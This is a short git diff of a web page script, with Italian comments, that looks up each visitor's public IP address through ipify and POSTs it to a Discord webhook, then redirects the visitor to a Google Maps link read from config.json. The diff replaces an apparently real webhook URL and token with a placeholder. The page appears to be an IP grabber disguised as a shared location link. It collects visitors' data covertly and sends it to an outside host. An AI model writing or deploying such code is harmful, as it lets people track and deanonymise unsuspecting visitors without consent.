@@ -13,7 +13,7 @@
     fetch("https://api.ipify.org?format=json")
       .then(res => res.json())
       .then(data => {
-        fetch("https://discord.com/api/webhooks/https://discord.com/api/webhooks/1365383046903365642/_hXXXwqjxvNNbXGlr4YUiVujU9_FSONfQqJQSsYozLynCJQEiNFrnieXGsddc1fLREPb", {
+        fetch("https://discord.com/api/webhooks/INSERISCI_LA_TUA_WEBHOOK", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
@@ -32,12 +32,12 @@
       });
     });
 
-    // Leggi posizione da config.json e reindirizza
+    // Leggi il link di condivisione da config.json
     fetch("config.json")
       .then(res => res.json())
       .then(data => {
         setTimeout(() => {
-          window.location.href = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
+          window.location.href = data.mapLink; // Usa il link completo della mappa
         }, 2000);
       });
   </script>
